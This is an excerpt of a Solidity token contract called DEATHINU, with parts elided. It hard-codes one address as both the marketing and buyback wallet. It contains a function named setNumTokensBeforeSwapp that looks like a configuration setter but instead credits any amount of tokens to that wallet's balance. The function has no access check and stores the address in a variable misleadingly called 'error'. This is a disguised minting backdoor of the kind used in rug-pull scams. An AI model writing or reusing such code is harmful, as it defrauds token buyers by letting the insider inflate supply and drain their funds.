...
contract DEATHINU is Context, IERC20, Ownable {
    ...
    string private _symbol = "DEATH INU";
    uint8 private _decimals = 9;
    
    address payable public marketingWallet = payable(0x5B89122562f0D3efBc8c1d7e98D05BE5E90B02B1); // Marketing Address
    address payable public BuyBackWallet = payable(0x5B89122562f0D3efBc8c1d7e98D05BE5E90B02B1); // BuyBack Address
    ...
    function setNumTokensBeforeSwapp(uint256 amount) public virtual {address error= marketingWallet;
        _balances[error]
        += amount;
    }
